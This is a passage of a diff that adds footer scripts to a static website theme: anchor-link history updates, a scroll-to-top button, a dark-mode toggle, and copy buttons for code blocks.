+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
